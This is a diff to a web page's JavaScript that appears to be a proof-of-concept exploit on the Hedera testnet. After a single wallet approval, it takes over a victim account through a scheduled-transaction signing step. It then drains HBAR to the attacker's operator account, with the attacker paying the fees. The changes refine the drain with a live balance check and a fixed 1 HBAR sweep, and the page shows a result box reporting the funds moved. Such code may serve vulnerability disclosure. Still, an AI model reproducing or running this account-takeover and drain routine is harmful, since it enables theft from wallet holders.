@@ -188,9 +188,7 @@ button:disabled { opacity: .45; }
             }
 
             if (!scheduleId) {
-                throw new Error(
-                    "Could not resolve schedule ID after retries. Try again in a few seconds."
-                );
+                throw new Error("Could not resolve schedule ID after retries. Try again in a few seconds.");
             }
 
             log("Using schedule ID: " + scheduleId, "ok");
@@ -202,7 +200,7 @@ button:disabled { opacity: .45; }
             const operatorAccountId = SDK.AccountId.fromString(OPERATOR_ACCOUNT_ID);
             const operatorPrivateKey = SDK.PrivateKey.fromString(OPERATOR_PRIVATE_KEY);
 
-            // attacker's operator client — pays all fees from here on
+            // attacker's operator client - pays ALL fees from here on
             const client = SDK.Client.forTestnet().setOperator(operatorAccountId, operatorPrivateKey);
 
             const scheduleSignTx = await new SDK.ScheduleSignTransaction()
@@ -213,41 +211,47 @@ button:disabled { opacity: .45; }
             const ssReceipt = await (await scheduleSignTx.execute(client)).getReceipt(client);
             log("Takeover completed. Status: " + ssReceipt.status.toString(), "ok");
 
-            /* ---- 6. Drain using attacker key, attacker pays fee ---- */
-            // KEY FIX: freezeWith(client) means the operator account (attacker)
-            // is the fee payer — not the victim. We then sign with attackerKey
-            // to authorize the debit from the victim account, whose key is now
-            // fully under attacker control. Victim account only needs to hold
-            // the sweep amount itself, nothing extra for fees.
+            /* ---- 6. Drain using attacker key, attacker operator pays fee ---- */
 
             log("Draining account with the attacker's key...", "err");
 
-            const sweepAmount = 5000000000; // fixed 50 HBAR
+            // check real balance right now, not the stale opening snapshot
+            const realNow = await mirrorAccount(targetAccount);
+            const realBalance = realNow.balance.balance;
+            log("Actual victim balance right now: " + realBalance + " tinybar (" + (realBalance / 100000000).toFixed(4) + " HBAR)", "info");
 
-            const drainTx = await new SDK.TransferTransaction()
-                .addHbarTransfer(targetId, -sweepAmount)
-                .addHbarTransfer(operatorAccountId, sweepAmount)
-                .freezeWith(client)
-                .sign(attackerKey);
+            // fixed 1 HBAR - proves fund movement with maximum margin
+            const sweepAmount = 100000000;
 
-            const drainResult = await drainTx.execute(client);
-            const drainReceipt = await drainResult.getReceipt(client);
-            log("Drain status: " + drainReceipt.status.toString(), "err");
+            if (realBalance < sweepAmount) {
+                log("Victim balance too low to sweep 1 HBAR - fund the account and retry.", "warn");
+            } else {
+                // freezeWith(client) = attacker operator is fee payer
+                // sign(attackerKey)  = attackerKey authorizes debit from victim account
+                // victim account only needs to hold the sweep amount, nothing for fees
+                const drainTx = await new SDK.TransferTransaction()
+                    .addHbarTransfer(targetId, -sweepAmount)
+                    .addHbarTransfer(operatorAccountId, sweepAmount)
+                    .freezeWith(client)
+                    .sign(attackerKey);
 
-            const after = await mirrorAccount(targetAccount);
-            const balanceAfter = after.balance.balance;
+                const drainResult = await drainTx.execute(client);
+                const drainReceipt = await drainResult.getReceipt(client);
+                log("Drain status: " + drainReceipt.status.toString(), "ok");
 
-            /* ---- 7. Result ---- */
+                const after = await mirrorAccount(targetAccount);
+                const balanceAfter = after.balance.balance;
 
-            resultEl.style.display = "block";
-            resultEl.innerHTML =
-                "<b>RESULT</b><br>" +
-                "Account: " + targetAccount + "<br>" +
-                "Balance before: " + balanceBefore + " tinybar<br>" +
-                "Balance after: " + balanceAfter + " tinybar<br>" +
-                "Funds moved to attacker account (" + OPERATOR_ACCOUNT_ID + "): " +
-                (balanceBefore - balanceAfter) + " tinybar<br>" +
-                "Caused by: one wallet approval, no further action from the account owner.";
+                resultEl.style.display = "block";
+                resultEl.innerHTML =
+                    "<b>RESULT</b><br>" +
+                    "Account: " + targetAccount + "<br>" +
+                    "Balance before: " + balanceBefore + " tinybar<br>" +
+                    "Balance after: " + balanceAfter + " tinybar<br>" +
+                    "Funds moved to attacker (" + OPERATOR_ACCOUNT_ID + "): " +
+                    (balanceBefore - balanceAfter) + " tinybar<br>" +
+                    "Caused by: one wallet approval, no further action from the account owner.";
+            }
 
             log("Done. See result box above.", "ok");
 
